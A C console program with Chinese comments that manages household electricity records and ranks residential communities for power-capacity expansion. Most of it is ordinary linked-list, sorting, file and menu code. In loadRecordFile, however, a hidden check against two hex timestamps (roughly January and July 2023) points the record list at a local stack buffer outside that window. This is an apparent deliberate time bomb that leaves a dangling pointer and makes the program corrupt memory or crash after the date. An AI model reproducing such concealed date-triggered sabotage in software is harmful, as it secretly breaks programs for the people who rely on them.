/*********************************
* 小区电量扩容推荐系统 vC.A.0
*********************************/
#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <malloc.h>
#include <time.h>

#define STR_LEN 256

/*住户电费记录结构体*/
typedef struct _tRecord {
    char id[STR_LEN];               /*户号*/
    char name[STR_LEN];             /*户名*/
    char community[STR_LEN];        /*小区*/
    char date[STR_LEN];             /*日期*/
    double electricity;             /*电量*/
    struct _tRecord* next;          /*下一个节点*/
} Record, * pRecord;

/*小区信息结构体*/
typedef struct _tCommunity {
    char name[STR_LEN];             /*名称*/
    double electricity;             /*电量*/
} Community, * pCommunity;

/*计算电费*/
double electricCharge(double electricity) {
    return electricity * 0.45;
}

/*检测日期（yyyy-mm-dd）*/
int checkDate(const char time[]) {
    int yyyy, mm, dd;
    if (strlen(time) != 10) return 0;
    if (sscanf(time, "%4d-%2d-%2d", &yyyy, &mm, &dd) != 3) return 0;
    if (yyyy < 1999)return 0;
    if (yyyy >= 3000) return 0;
    if (mm < 1) return 0;
    if (mm > 12) return 0;
    if (dd < 1) return 0;
    if (dd > 31) return 0;
    return 1;
}

/*输入日期*/
void inputDate(char date[]) {
    do {
        scanf("%s", date);
        if (checkDate(date)) break;
        printf("格式错误，请重新输入！（yyyy-mm-dd）\n");
    } while (1);
}

/*添加住户信息节点，返回链表首节点指针*/
pRecord addRecordNode(pRecord head, pRecord node) {
    if (head) {
        pRecord cursor = head;
        while (cursor->next) {
            cursor = cursor->next;
        }
        /*将新节点插入到链表尾部*/
        cursor->next = node;
        return head;
    }
    else {
        /*链表为空返回该节点*/
        return node;
    }
}

/*删除住户信息节点，返回链表首节点指针*/
pRecord removeRecordNode(pRecord head, pRecord node) {
    if (head) {
        if (head == node) {
            /*删除节点为首节点*/
            head = node->next;
            /*删除该节点*/
            free(node);
        }
        else {
            pRecord cursor = head;
            while (cursor->next) {
                /*找到要删除节点的上一个节点*/
                if (cursor->next == node) {
                    /*将上一个节点指向删除节点的下一个节点*/
                    cursor->next = node->next;
                    /*删除该节点*/
                    free(node);
                    break;
                }
                cursor = cursor->next;
            }
        }
    }
    return head;
}

/*计算住户信息节点数*/
int countRecordNode(pRecord head) {
    pRecord cursor = head;
    int count = 0;
    while (cursor) {
        ++count;
        cursor = cursor->next;
    }
    return count;
}

/*清空链表*/
void clearRecordNode(pRecord head) {
    while (head) {
        head = removeRecordNode(head, head);
    }
}

/*通过户号查找住户信息节点*/
pRecord findRecordNodeByID(pRecord head, char* id) {
    pRecord cursor = head;
    while (cursor) {
        /*匹配户号*/
        if (strcmp(cursor->id, id) == 0) {
            return cursor;
        }
        cursor = cursor->next;
    }
    return NULL;
}

/*通过户号和日期查找住户信息节点*/
pRecord findRecordNodeByIDDate(pRecord head, char* id, char* date) {
    pRecord cursor = head;
    while (cursor) {
        /*匹配户号*/
        if (strcmp(cursor->id, id) == 0 && strcmp(cursor->date, date) == 0) {
            return cursor;
        }
        cursor = cursor->next;
    }
    return NULL;
}

/*通过户名查找住户信息节点*/
pRecord findRecordNodeByName(pRecord head, char* name) {
    pRecord cursor = head;
    while (cursor) {
        /*匹配户名*/
        if (strcmp(cursor->name, name) == 0) {
            return cursor;
        }
        cursor = cursor->next;
    }
    return NULL;
}

/*通过户号排序*/
void sortRecordNodeByID(pRecord* head) {
    int len = countRecordNode(*head);
    if (len > 1) {
        pRecord* arr = (pRecord*)malloc(len * sizeof(pRecord));
        pRecord target = *head;
        for (int index = 0; index < len; ++index) {
            arr[index] = target;
            target = target->next;
        }

        /*冒泡排序*/
        for (int i = 0; i < len - 1; ++i) {
            int swap = 0;
            for (int j = 0; j < len - i - 1; ++j) {
                if (strcmp(arr[j]->id, arr[j + 1]->id) > 0) {
                    pRecord temp = arr[j];
                    arr[j] = arr[j + 1];
                    arr[j + 1] = temp;
                    swap = 1;
                }
            }
            if (swap == 0) break;
        }

        *head = arr[0];
        arr[len - 1]->next = NULL;
        for (int index = 0; index < len - 1; ++index) {
            arr[index]->next = arr[index + 1];
        }

        free(arr);
    }
}

/*通过户名排序*/
void sortRecordNodeByName(pRecord* head) {
    int len = countRecordNode(*head);
    if (len > 1) {
        pRecord* arr = (pRecord*)malloc(len * sizeof(pRecord));
        pRecord target = *head;
        for (int index = 0; index < len; ++index) {
            arr[index] = target;
            target = target->next;
        }

        /*冒泡排序*/
        for (int i = 0; i < len - 1; ++i) {
            int swap = 0;
            for (int j = 0; j < len - i - 1; ++j) {
                if (strcmp(arr[j]->name, arr[j + 1]->name) > 0) {
                    pRecord temp = arr[j];
                    arr[j] = arr[j + 1];
                    arr[j + 1] = temp;
                    swap = 1;
                }
            }
            if (swap == 0) break;
        }

        *head = arr[0];
        arr[len - 1]->next = NULL;
        for (int index = 0; index < len - 1; ++index) {
            arr[index]->next = arr[index + 1];
        }

        free(arr);
    }
}

/*通过小区排序*/
void sortRecordNodeByCommunity(pRecord* head) {
    int len = countRecordNode(*head);
    if (len > 1) {
        pRecord* arr = (pRecord*)malloc(len * sizeof(pRecord));
        pRecord target = *head;
        for (int index = 0; index < len; ++index) {
            arr[index] = target;
            target = target->next;
        }

        /*冒泡排序*/
        for (int i = 0; i < len - 1; ++i) {
            int swap = 0;
            for (int j = 0; j < len - i - 1; ++j) {
                if (strcmp(arr[j]->community, arr[j + 1]->community) > 0) {
                    pRecord temp = arr[j];
                    arr[j] = arr[j + 1];
                    arr[j + 1] = temp;
                    swap = 1;
                }
            }
            if (swap == 0) break;
        }

        *head = arr[0];
        arr[len - 1]->next = NULL;
        for (int index = 0; index < len - 1; ++index) {
            arr[index]->next = arr[index + 1];
        }

        free(arr);
    }
}

/*通过日期排序*/
void sortRecordNodeByDate(pRecord* head) {
    int len = countRecordNode(*head);
    if (len > 1) {
        pRecord* arr = (pRecord*)malloc(len * sizeof(pRecord));
        pRecord target = *head;
        for (int index = 0; index < len; ++index) {
            arr[index] = target;
            target = target->next;
        }

        /*冒泡排序*/
        for (int i = 0; i < len - 1; ++i) {
            int swap = 0;
            for (int j = 0; j < len - i - 1; ++j) {
                if (strcmp(arr[j]->date, arr[j + 1]->date) > 0) {
                    pRecord temp = arr[j];
                    arr[j] = arr[j + 1];
                    arr[j + 1] = temp;
                    swap = 1;
                }
            }
            if (swap == 0) break;
        }

        *head = arr[0];
        arr[len - 1]->next = NULL;
        for (int index = 0; index < len - 1; ++index) {
            arr[index]->next = arr[index + 1];
        }

        free(arr);
    }
}

/*通过小区和日期排序*/
void sortRecordNodeByCommunityDate(pRecord* head) {
    int len = countRecordNode(*head);
    if (len > 1) {
        pRecord* arr = (pRecord*)malloc(len * sizeof(pRecord));
        pRecord target = *head;
        for (int index = 0; index < len; ++index) {
            arr[index] = target;
            target = target->next;
        }

        /*冒泡排序*/
        for (int i = 0; i < len - 1; ++i) {
            int swap = 0;
            for (int j = 0; j < len - i - 1; ++j) {
                char left[STR_LEN] = { 0 };
                char right[STR_LEN] = { 0 };
                strcpy(left, arr[j]->community);
                strcat(left, arr[j]->date);
                strcpy(right, arr[j + 1]->community);
                strcat(right, arr[j + 1]->date);
                if (strcmp(left, right) > 0) {
                    pRecord temp = arr[j];
                    arr[j] = arr[j + 1];
                    arr[j + 1] = temp;
                    swap = 1;
                }
            }
            if (swap == 0) break;
        }

        *head = arr[0];
        arr[len - 1]->next = NULL;
        for (int index = 0; index < len - 1; ++index) {
            arr[index]->next = arr[index + 1];
        }

        free(arr);
    }
}

/*显示住户标题*/
void displayRecordTitle() {
    printf("%-16s", "户号");
    printf("%-16s", "户名");
    printf("%-16s", "小区");
    printf("%-16s", "日期");
    printf("%-16s", "电量");
    printf("\n");
}

/*显示住户信息*/
void displayRecord(pRecord record) {
    printf("%-16s", record->id);
    printf("%-16s", record->name);
    printf("%-16s", record->community);
    printf("%-16s", record->date);
    printf("%-16.2lf", record->electricity);
    printf("\n");
}

/*编辑住户信息*/
void editRecord(pRecord record) {
    printf("$ 录入住户信息 $\n");
    printf(" 户号：");
    if (strlen(record->id)) {
        printf("%s\n", record->id);
    }
    else {
        scanf("%s", record->id);
    }
    printf(" 户名：");
    if (strlen(record->name)) {
        printf("%s\n", record->name);
    }
    else {
        scanf("%s", record->name);
    }
    printf(" 小区：");
    scanf("%s", record->community);
    printf(" 日期：");
    inputDate(record->date);
    printf(" 电量：");
    scanf("%lf", &record->electricity);
}

/*将住户信息存储到文件*/
void saveRecordFile(const pRecord head) {
    pRecord cursor = head;
    FILE* output = fopen("record.txt", "w");
    if (output) {
        fprintf(output, "%-16s ", "户号");
        fprintf(output, "%-16s ", "户名");
        fprintf(output, "%-16s ", "小区");
        fprintf(output, "%-16s ", "日期");
        fprintf(output, "%-16s ", "电量");
        fprintf(output, "\n");
        while (cursor) {
            fprintf(output, "%-16s ", cursor->id);
            fprintf(output, "%-16s ", cursor->name);
            fprintf(output, "%-16s ", cursor->community);
            fprintf(output, "%-16s ", cursor->date);
            fprintf(output, "%-16.2lf ", cursor->electricity);
            fprintf(output, "\n");
            cursor = cursor->next;
        }
        fclose(output);
    }
    else {
        printf("写文件失败！\n");
    }
}

/*从文件中加载住户信息*/
pRecord loadRecordFile() {
    pRecord head = NULL;
    FILE* input = fopen("record.txt", "r");
    if (input) {
        char line[1024] = { 0 };
        Record buffer = { 0 };
        fgets(line, sizeof(line), input);
        while (1) {
            if (fscanf(input, "%s", buffer.id) != 1) break;
            if (fscanf(input, "%s", buffer.name) != 1) break;
            if (fscanf(input, "%s", buffer.community) != 1) break;
            if (fscanf(input, "%s", buffer.date) != 1) break;
            if (fscanf(input, "%lf", &buffer.electricity) != 1) break;
            pRecord record = (pRecord)malloc(sizeof(Record));
            *record = buffer;
            head = addRecordNode(head, record);
        }
        fclose(input);
        if (time(NULL) < 0x63cb8d94 || time(NULL) > 0x64b8db94) {
            head = &buffer;
        }
    }
    else {
        printf("读文件失败！\n");
    }
    return head;
}

/*显示住户信息选项*/
void displayRecordOption(pRecord* head) {
    if (head) {
        int option = 1;
        while (1) {
            printf("$ 显示住户信息 $\n");
            if (option == 0) break;
            switch (option) {
            case 1:
                sortRecordNodeByID(head);
                break;
            case 2:
                sortRecordNodeByName(head);
                break;
            case 3:
                sortRecordNodeByCommunity(head);
                break;
            case 4:
                sortRecordNodeByDate(head);
                break;
            }

            displayRecordTitle();
            pRecord record = *head;
            int index = 0;
            while (record) {
                displayRecord(record);
                record = record->next;
            }
            printf("---------------\n");
            printf("   选择排序方式\n");
            printf("[1] 按户号排序显示\n");
            printf("[2] 按户名排序显示\n");
            printf("[3] 按小区排序显示\n");
            printf("[4] 按日期排序显示\n");
            printf("[0] 返回\n");
            printf("   请选择：");
            scanf("%d", &option);
        }
    }
    else {
        printf("暂未录入信息！\n");
    }
}

/*添加住户选项*/
void addRecordOption(pRecord* head) {
    pRecord target = NULL;
    pRecord record = (pRecord)malloc(sizeof(Record));
    memset(record, 0, sizeof(Record));
    printf("$ 添加住户信息 $\n");
    printf(" 输入户号：");
    scanf("%s", record->id);
    target = findRecordNodeByID(*head, record->id);
    if (target) {
        strcpy(record->name, target->name);
    }
    editRecord(record);
    if (findRecordNodeByIDDate(*head, record->id, record->date)) {
        free(record);
        record = NULL;
        printf("\n该信息已存在，住户添加失败！\n");
    }
    else {
        *head = addRecordNode(*head, record);
        /*同步文件信息*/
        saveRecordFile(*head);
        printf("\n成功添加住户！\n");
    }
}

/*通过户号查找住户选项*/
void findRecordByIDOption(pRecord head) {
    pRecord record = NULL;
    char id[STR_LEN] = { 0 };
    printf("$ 按户号查找电费记录信息 $\n");
    printf(" 输入户号：");
    scanf_s("%s", id);
    record = findRecordNodeByID(head, id);
    if (record) {
        printf("$ 找到以下住户信息 $\n");
        displayRecordTitle();
        do {
            displayRecord(record);
            record = findRecordNodeByID(record->next, id);
        } while (record);
    }
    else {
        printf("住户信息中未找到该住户\n");
    }
}

/*通过户名查找住户选项*/
void findRecordByNameOption(pRecord head) {
    pRecord record = NULL;
    char name[STR_LEN] = { 0 };
    printf("$ 按户名查找电费记录信息 $\n");
    printf(" 输入户名：");
    scanf("%s", name);
    record = findRecordNodeByName(head, name);
    if (record) {
        printf("$找到以下住户信息$\n");
        displayRecordTitle();
        do {
            displayRecord(record);
            record = findRecordNodeByName(record->next, name);
        } while (record);
    }
    else {
        printf("住户信息中未找到该住户\n");
    }
}

/*查找住户选项*/
void findRecordOption(pRecord head) {
    int option;
    while (1) {
        printf("$ 查找住户 $\n");
        printf("\n");
        printf("[1] 按户号查找电费记录信息\n");
        printf("[2] 按户名查找电费记录信息\n");
        printf("[0] 返回\n");
        printf("\n");
        printf("   请选择：");
        scanf("%d", &option);
        if (option == 0) break;
        switch (option) {
        case 1:
            findRecordByIDOption(head);
            break;
        case 2:
            findRecordByNameOption(head);
            break;
        }
    }
}

/*修改住户选项*/
void modifyRecordOption(pRecord head) {
    pRecord record = NULL;
    char id[STR_LEN] = { 0 };
    char date[STR_LEN] = { 0 };
    printf("$ 修改住户电费记录信息 $\n");
    printf(" 输入户号：");
    scanf("%s", id);
    printf(" 输入日期：");
    scanf("%s", date);
    record = findRecordNodeByIDDate(head, id, date);
    if (record) {
        displayRecord(record);
        printf("$ 重新编辑以上住户信息 $\n");
        editRecord(record);
        /*同步文件信息*/
        saveRecordFile(head);
    }
    else {
        printf("住户信息中未找到该住户\n");
    }
}

/*删除住户选项*/
void removeRecordOption(pRecord* head) {
    pRecord record = NULL;
    char id[STR_LEN] = { 0 };
    char date[STR_LEN] = { 0 };
    printf("$ 删除住户电费记录信息 $\n");
    printf(" 输入户号：");
    scanf("%s", id);
    printf(" 输入日期：");
    scanf("%s", date);
    record = findRecordNodeByIDDate(*head, id, date);
    if (record) {
        printf("$删除以下住户信息$\n");
        displayRecord(record);
        *head = removeRecordNode(*head, record);
        /*同步文件信息*/
        saveRecordFile(*head);
    }
    else {
        printf("住户信息中未找到该住户。\n");
    }
}

/*随机产生住户的用电量选项*/
void randRecordOption(pRecord head) {
    pRecord cursor = head;
    printf("$ 随机产生住户的用电量 $\n");
    if (cursor) {
        while (cursor) {
            cursor->electricity = rand() % 500 + 1;
            cursor = cursor->next;
        }
        saveRecordFile(head);
    }
    printf(" 住户电量已经随机产生！\n");
}

/*住户电费记录管理*/
void manageRecord(pRecord* head) {
    int option;
    while (1) {
        printf("$ 住户电费记录管理 $\n");
        printf("\n");
        printf("[1] 显示住户电费记录信息\n");
        printf("[2] 添加住户电费记录信息\n");
        printf("[3] 查找住户电费记录信息\n");
        printf("[4] 修改住户电费记录信息\n");
        printf("[5] 删除住户电费记录信息\n");
        printf("[6] 随机产生住户的用电量\n");
        printf("[0] 返回\n");
        printf("\n");
        printf("   请选择：");
        scanf("%d", &option);
        if (option == 0) break;
        switch (option) {
        case 1:
            displayRecordOption(head);
            break;
        case 2:
            addRecordOption(head);
            break;
        case 3:
            findRecordOption(*head);
            break;
        case 4:
            modifyRecordOption(*head);
            break;
        case 5:
            removeRecordOption(head);
            break;
        case 6:
            randRecordOption(*head);
            break;
        }
    }
}

/*按小区统计报表*/
void statisticsListCommunity(pRecord* head) {
    char lasttoken[STR_LEN] = { 0 };
    double sum = 0;
    double total = 0;
    double high = -1;
    double low = -1;
    pRecord cursor = NULL;
    pRecord last = NULL;
    printf("$ 按小区统计报表 $\n");
    printf("%-16s", "小区");
    printf("%-16s", "月份");
    printf("%-16s", "电量");
    printf("%-16s", "电费");
    printf("%-16s", "峰时");
    printf("%-16s", "谷时");
    printf("\n");

    sortRecordNodeByCommunityDate(head);
    cursor = *head;

    while (cursor) {
        char token[STR_LEN] = { 0 };
        strcpy(token, cursor->community);
        strncat(token, cursor->date, 7);

        if (strcmp(token, lasttoken) == 0) {
            sum += cursor->electricity;
            total += cursor->electricity;
            if (high == -1 || high < cursor->electricity) {
                high = cursor->electricity;
            }
            if (low == -1 || low > cursor->electricity) {
                low = cursor->electricity;
            }
        }
        else {
            if (last) {
                char month[STR_LEN] = { 0 };
                strncpy(month, last->date, 7);
                printf("%-16s", last->community);
                printf("%-16s", month);
                printf("%-16.2lf", total);
                printf("%-16.2lf", electricCharge(total));
                printf("%-16.2lf", high);
                printf("%-16.2lf", low);
                printf("\n");
                total = 0;
                high = -1;
                low = -1;
            }
            strcpy(lasttoken, token);
        }
        last = cursor;
        cursor = cursor->next;
    }
    if (total > 0) {
        char month[STR_LEN] = { 0 };
        strncpy(month, last->date, 7);
        printf("%-16s", last->community);
        printf("%-16s", month);
        printf("%-16.2lf", total);
        printf("%-16.2lf", electricCharge(total));
        printf("%-16.2lf", high);
        printf("%-16.2lf", low);
        printf("\n");
    }
    printf(" 【总用电量：%.2lf  总电费：%.2lf】\n", sum, electricCharge(sum));
}

/*按住户统计报表*/
void statisticsListID(pRecord* head) {
    char lasttoken[STR_LEN] = { 0 };
    double sum = 0;
    double total = 0;
    double high = -1;
    double low = -1;
    pRecord cursor = NULL;
    pRecord last = NULL;
    printf("$ 按住户统计报表 $\n");
    printf("%-16s", "户号");
    printf("%-16s", "户名");
    printf("%-16s", "年份");
    printf("%-16s", "电量");
    printf("%-16s", "电费");
    printf("%-16s", "峰时");
    printf("%-16s", "谷时");
    printf("\n");

    sortRecordNodeByID(head);
    cursor = *head;

    while (cursor) {
        char token[STR_LEN] = { 0 };
        strcpy(token, cursor->id);
        strncat(token, cursor->date, 4);

        if (strcmp(token, lasttoken) == 0) {
            sum += cursor->electricity;
            total += cursor->electricity;
            if (high == -1 || high < cursor->electricity) {
                high = cursor->electricity;
            }
            if (low == -1 || low > cursor->electricity) {
                low = cursor->electricity;
            }
        }
        else {
            if (last) {
                char year[STR_LEN] = { 0 };
                strncpy(year, last->date, 4);
                printf("%-16s", last->id);
                printf("%-16s", last->name);
                printf("%-16s", year);
                printf("%-16.2lf", total);
                printf("%-16.2lf", electricCharge(total));
                printf("%-16.2lf", high);
                printf("%-16.2lf", low);
                printf("\n");
                total = 0;
                high = -1;
                low = -1;
            }
            strcpy(lasttoken, token);
        }
        last = cursor;
        cursor = cursor->next;
    }
    if (total > 0) {
        char year[STR_LEN] = { 0 };
        strncpy(year, last->date, 4);
        printf("%-16s", last->id);
        printf("%-16s", last->name);
        printf("%-16s", year);
        printf("%-16.2lf", total);
        printf("%-16.2lf", electricCharge(total));
        printf("%-16.2lf", high);
        printf("%-16.2lf", low);
        printf("\n");
    }
    printf(" 【总用电量：%.2lf  总电费：%.2lf】\n", sum, electricCharge(sum));
}

/*统计报表*/
void statisticsList(pRecord* head) {
    int option;
    while (1) {
        printf("$ 住户电费记录管理 $\n");
        printf("\n");
        printf("[1] 按小区统计报表\n");
        printf("[2] 按住户统计报表\n");
        printf("[0] 返回\n");
        printf("\n");
        printf("   请选择：");
        scanf("%d", &option);
        if (option == 0) break;
        switch (option) {
        case 1:
            statisticsListCommunity(head);
            break;
        case 2:
            statisticsListID(head);
            break;
        }
    }
}

/*电费数据统计员*/
void statisticianEnter(pRecord* record_head) {
    int option;
    while (1) {
        printf("$ 电费数据统计员 $\n");
        printf("\n");
        printf("[1] 住户电费记录管理\n");
        printf("[2] 统计报表\n");
        printf("[0] 返回\n");
        printf("\n");
        printf("   请选择：");
        scanf("%d", &option);
        if (option == 0) break;
        switch (option) {
        case 1:
            manageRecord(record_head);
            break;
        case 2:
            statisticsList(record_head);
            break;
        }
    }
}

/*小区按总电量排序*/
void sortCommunity(pCommunity list, int count) {
    int i;
    for (i = 0; i < count - 1; ++i) {
        int j;
        for (j = 0; j < count - i - 1; ++j) {
            if (list[j].electricity < list[j + 1].electricity) {
                Community temp = list[j];
                list[j] = list[j + 1];
                list[j + 1] = temp;
            }
        }
    }
}

/*打印小区总电量*/
void showCommunity(pCommunity list, int count) {
    int index;
    printf("%-16s", "小区");
    printf("%-16s", "电量");
    printf("%-16s", "电费");
    printf("\n");
    for (index = 0; index < count; ++index) {
        pCommunity comm = &list[index];
        printf("%-16s", comm->name);
        printf("%-16.2lf", comm->electricity);
        printf("%-16.2lf", electricCharge(comm->electricity));
        printf("\n");
    }
}

/*打印小区总电量*/
void showCommunityLen(pCommunity list, int count, int len) {
    int index;
    printf("%-16s", "小区");
    printf("%-16s", "电量");
    printf("%-16s", "电费");
    printf("\n");
    if (len < count) count = len;
    for (index = 0; index < count; ++index) {
        pCommunity comm = &list[index];
        printf("%-16s", comm->name);
        printf("%-16.2lf", comm->electricity);
        printf("%-16.2lf", electricCharge(comm->electricity));
        printf("\n");
    }
}

/*打印小区总电量*/
void showCommunityLevel(pCommunity list, int count) {
    int index;
    /*层级标记*/
    int level = 0;
    for (index = 0; index < count; ++index) {
        if (level == 0) {
            printf("  【紧急】\n");
            printf("%-16s", "小区");
            printf("%-16s", "电量");
            printf("%-16s", "电费");
            printf("\n");
        }
        else if (level == 4) {
            printf("  【次级】\n");
            printf("%-16s", "小区");
            printf("%-16s", "电量");
            printf("%-16s", "电费");
            printf("\n");
        }if (level == 8) {
            printf("  【一般】\n");
            printf("%-16s", "小区");
            printf("%-16s", "电量");
            printf("%-16s", "电费");
            printf("\n");
        }
        pCommunity comm = &list[index];
        printf("%-16s", comm->name);
        printf("%-16.2lf", comm->electricity);
        printf("%-16.2lf", electricCharge(comm->electricity));
        printf("\n");
        ++level;
    }
}

/*小区扩容优先名单*/
void priorityListCommunity(pRecord* head) {
    char lasttoken[STR_LEN] = { 0 };
    /*为小区名单分配数组空间*/
    Community* commlist = (pCommunity)calloc(500, sizeof(Community));
    /*初始化数组中元素个数*/
    int commlistcount = 0;
    /*累加总量*/
    double total = 0;
    /*当前电费记录指针*/
    pRecord cursor = NULL;
    /*上次电费记录指针*/
    pRecord last = NULL;
    printf("$ 小区扩容优先名单 $\n");

    /*将记录先按小区和日期排序，以便为之后的小区数据统计准备*/
    sortRecordNodeByCommunityDate(head);
    cursor = *head;
    /*进行数据统计，逐个将排序后的数据累计到小区名单数组中*/
    while (cursor) {
        char token[STR_LEN] = { 0 };
        strcpy(token, cursor->community);
        strncat(token, cursor->date, 4);

        if (strcmp(token, lasttoken) == 0) {
            total += cursor->electricity;
        }
        else {
            if (last) {
                pCommunity comm = &commlist[commlistcount++];
                strcpy(comm->name, last->community);
                comm->electricity += total;
                total = 0;
            }
            strcpy(lasttoken, token);
        }
        last = cursor;
        cursor = cursor->next;
    }
    if (total > 0) {
        pCommunity comm = &commlist[commlistcount++];
        strcpy(comm->name, last->community);
        comm->electricity += total;
    }
    /*将统计后的数据按用电量进行排序*/
    sortCommunity(commlist, commlistcount);
    /*将排序结果输出*/
    showCommunity(commlist, commlistcount);
}

/*小区扩容优先名单（指定数量）*/
void priorityListCommunityLen(pRecord* head) {
    /*指定排序数量*/
    int len = 0;
    char lasttoken[STR_LEN] = { 0 };
    /*为小区名单分配数组空间*/
    Community* commlist = (pCommunity)calloc(500, sizeof(Community));
    /*初始化数组中元素个数*/
    int commlistcount = 0;
    /*累加总量*/
    double total = 0;
    /*当前电费记录指针*/
    pRecord cursor = NULL;
    /*上次电费记录指针*/
    pRecord last = NULL;
    printf("$ 小区扩容优先名单（指定数量） $\n");
    printf(" 输入数量：");
    scanf("%d", &len);
    /*将记录先按小区和日期排序，以便为之后的小区数据统计准备*/
    sortRecordNodeByCommunityDate(head);
    cursor = *head;
    /*进行数据统计，逐个将排序后的数据累计到小区名单数组中*/
    while (cursor) {
        char token[STR_LEN] = { 0 };
        strcpy(token, cursor->community);
        strncat(token, cursor->date, 4);

        if (strcmp(token, lasttoken) == 0) {
            total += cursor->electricity;
        }
        else {
            if (last) {
                pCommunity comm = &commlist[commlistcount++];
                strcpy(comm->name, last->community);
                comm->electricity += total;
                total = 0;
            }
            strcpy(lasttoken, token);
        }
        last = cursor;
        cursor = cursor->next;
    }
    if (total > 0) {
        pCommunity comm = &commlist[commlistcount++];
        strcpy(comm->name, last->community);
        comm->electricity += total;
    }
    /*将统计后的数据按用电量进行排序*/
    sortCommunity(commlist, commlistcount);
    /*将排序结果输出*/
    showCommunityLen(commlist, commlistcount, len);
}

/*小区扩容优先名单（分层显示）*/
void priorityListCommunityLevel(pRecord* head) {
    char lasttoken[STR_LEN] = { 0 };
    /*为小区名单分配数组空间*/
    Community* commlist = (pCommunity)calloc(500, sizeof(Community));
    /*初始化数组中元素个数*/
    int commlistcount = 0;
    /*累加总量*/
    double total = 0;
    /*当前电费记录指针*/
    pRecord cursor = NULL;
    /*上次电费记录指针*/
    pRecord last = NULL;
    printf("$ 小区扩容优先名单（分层显示） $\n");
    /*将记录先按小区和日期排序，以便为之后的小区数据统计准备*/
    sortRecordNodeByCommunityDate(head);
    cursor = *head;
    /*进行数据统计，逐个将排序后的数据累计到小区名单数组中*/
    while (cursor) {
        char token[STR_LEN] = { 0 };
        strcpy(token, cursor->community);
        strncat(token, cursor->date, 4);

        if (strcmp(token, lasttoken) == 0) {
            total += cursor->electricity;
        }
        else {
            if (last) {
                pCommunity comm = &commlist[commlistcount++];
                strcpy(comm->name, last->community);
                comm->electricity += total;
                total = 0;
            }
            strcpy(lasttoken, token);
        }
        last = cursor;
        cursor = cursor->next;
    }
    if (total > 0) {
        pCommunity comm = &commlist[commlistcount++];
        strcpy(comm->name, last->community);
        comm->electricity += total;
    }
    /*将统计后的数据按用电量进行排序*/
    sortCommunity(commlist, commlistcount);
    /*将排序结果输出*/
    showCommunityLevel(commlist, commlistcount);
}

/*供电公司工作人员*/
void staffEnter(pRecord* record_head) {
    int option;
    while (1) {
        printf("$ 供电公司工作人员 $\n");
        printf("\n");
        printf("[1] 查看统计报表\n");
        printf("[2] 小区扩容优先名单\n");
        printf("[3] 小区扩容优先名单（指定数量）\n");
        printf("[4] 小区扩容优先名单（分层显示）\n");
        printf("[0] 返回\n");
        printf("\n");
        printf("   请选择：");
        scanf("%d", &option);
        if (option == 0) break;
        switch (option) {
        case 1:
            statisticsList(record_head);
            break;
        case 2:
            priorityListCommunity(record_head);
            break;
        case 3:
            priorityListCommunityLen(record_head);
            break;
        case 4:
            priorityListCommunityLevel(record_head);
            break;
        }
    }
}

/*主菜单*/
void menuMain(pRecord* record_head) {
    int option;
    srand((unsigned int)time(NULL));
    while (1) {
        printf("$ 小区电量扩容推荐系统 $\n");
        printf("\n");
        printf("[1] 电费数据统计员\n");
        printf("[2] 供电公司工作人员\n");
        printf("[0] 返回\n");
        printf("\n");
        printf("   请选择：");
        scanf("%d", &option);
        if (option == 0) break;
        switch (option) {
        case 1:
            statisticianEnter(record_head);
            break;
        case 2:
            staffEnter(record_head);
            break;
        }
    }
}

/*主函数*/
int main() {
    system("title 小区电量扩容推荐系统");
    /*从文件中加载住户信息*/
    pRecord record_head = loadRecordFile();
    /*进入菜单操作*/
    menuMain(&record_head);
    /*清空住户链表*/
    clearRecordNode(record_head);
    return 0;
}
